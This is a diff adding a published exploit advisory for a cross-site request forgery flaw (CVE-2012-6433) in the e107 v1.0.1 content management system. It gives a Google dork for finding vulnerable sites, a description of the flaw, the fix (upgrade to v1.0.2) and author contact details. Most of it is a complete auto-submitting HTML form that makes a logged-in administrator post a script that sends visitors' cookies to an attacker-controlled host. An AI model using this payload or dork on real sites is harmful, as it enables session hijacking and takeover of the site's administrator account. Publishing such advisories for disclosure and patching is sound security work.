@@ -1,0 +1,72 @@
+# Exploit Title: e107 v1.0.1 Administrator CSRF Resulting in Arbitrary Javascript Execution
+# Google Dork: intext:"This site is powered by e107"
+# Date: 01/01/13
+# Exploit Author: Joshua Reynolds
+# Vendor Homepage: http://e107.org
+# Software Link: http://sourceforge.net/projects/e107/files/e107/e107%20v1.0.1/e107_1.0.1_full.tar.gz/download
+# Version: 1.0.1
+# Tested on: BT5R1 - Ubuntu 10.04.2 LTS
+# CVE: CVE-2012-6433
+------------------------------------------------------------------------------------------
+Description:
+
+A Cross-Site Request Forgery vulnerability exists in the /e107_admin/newspost.php?create 
+function, in which an attacker can create a malicious POST request that could be sent by a
+logged in e107 Administrator (upon visiting a malicious site using an iFrame known as a 
+drive-by attack, or other means). This is possible since e-tokens or any other request 
+validation is not used during this type of request. The severity of this vulnerability 
+increases when the Administrator has the ability to post News Items containing javascript.
+ 
+This results in an attacker having the ability to force an administrator to post any arbitrary 
+javascript to the front page of the e107 site. Also, once posted, the resulting page: 
+/e107/e107_admin/newspost.php displays the new content to the Administrator, and if this 
+javascript is set in the news_title POST parameter, it is executed on this page in the 
+context of the Administrator. This results in the ability for an attacker to use any type
+of javascript attack at this point in time on the Administrator through the backend news 
+items, and/or on the front end to any logged in user that may visit this page. What 
+naturally comes to mind is session hijacking through established User/Administrator cookies.
+------------------------------------------------------------------------------------------
+Exploit:
+
+<html>
+<body onload="document.formCSRF.submit();">
+	<form method="POST" name="formCSRF" action="http://[site]/e107_admin/newspost.php?create">
+		<input type="hidden" name="cat_id" value="1"/>
+		<input type="hidden" name="news_title" value="<script>location.href='http://[evil_site]/cookiemonster.php?cookie='+document.cookie;</script>"
+		<input type="hidden" name="news_summary" value=""/>
+		<input type="hidden" name="data" value=""/>
+		<input type="hidden" name="news" value=""/>
+		<input type="hidden" name="sizeselect" value=""/>
+		<input type="hidden" name="preimageselect" value=""/>
+		<input type="hidden" name="news_extended" value=""/>
+		<input type="hidden" name="extended" value=""/>
+		<input type="hidden" name="sizeselect" value=""/>
+		<input type="hidden" name="preimageselect" value=""/>
+		<input type="hidden" name="file_userfile[]" value=""/>
+		<input type="hidden" name="uploadtype[]" value="resize"/>
+		<input type="hidden" name="resize_value" value="100"/>
+		<input type="hidden" name="news_allow_comments" value="0"/>
+		<input type="hidden" name="news_rendertype" value="0"/>
+		<input type="hidden" name="news_start" value=""/>
+		<input type="hidden" name="news_end" value=""/>
+		<input type="hidden" name="news_datestamp" value=""/>
+		<input type="hidden" name="news_userclass[0]" value="1"/>
+		<input type="hidden" name="news_author" value="1"/>
+		<input type="hidden" name="submit_news" value="Post news to database"/>
+		<input type="hidden" name="news_id" value=""/>
+	</form>
+</body>
+</html>
+------------------------------------------------------------------------------------------
+Fix:
+
+The bug has been fixed in the following revision: r12992
+Upgrade to v1.0.2
+------------------------------------------------------------------------------------------
+Shout outs: Red Hat Security Team, Ms. Umer, Dr. Wu, Tim Williams, friends, & family.
+
+Contact: 
+Mail: infosec4breakfast@gmail.com
+Blog: infosec4breakfast.com
+Twitter: @jershmagersh
+Youtube: youtube.com/user/infosec4breakfast
